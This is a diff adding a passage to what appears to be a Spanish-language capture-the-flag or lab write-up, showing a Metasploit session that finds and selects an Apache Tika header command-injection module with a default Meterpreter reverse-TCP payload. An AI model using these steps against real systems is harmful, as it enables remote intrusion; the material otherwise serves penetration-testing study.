@@ -91,9 +91,32 @@ lo mas probable es que este sea el caminoi correcto, investigare mas sobre la vu
 
 
 
+[davidoberst@archlinux Web-Content]$ msfconsole
+
+msf > search tika
+
+Matching Modules
+================
+
+   #  Name                                                 Disclosure Date  Rank       Check  Description
+   -  ----                                                 ---------------  ----       -----  -----------
+   0  exploit/windows/http/apache_tika_jp2_jscript         2018-04-25       excellent  Yes    Apache Tika Header Command Injection
+   1  post/linux/gather/puppet                             .                normal     No     Puppet Config Gather
+   2  auxiliary/scanner/http/wp_gimedia_library_file_read  .                normal     No     WordPress GI-Media Library Plugin Directory Traversal Vulnerability
+
+
+hay algunos eexploits, usare el 0, pero antes quiero asegurarme que la version del exploit funcione con la version de tika : 
 
 
 
+msf > use 0
+[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
+msf exploit(windows/http/apache_tika_jp2_jscript) > info
+Description:
+  This module exploits a command injection vulnerability in Apache
+  Tika 1.15 - 1.17 on Windows.
+
+funciona, vamos a usarlo : 
 
 
 
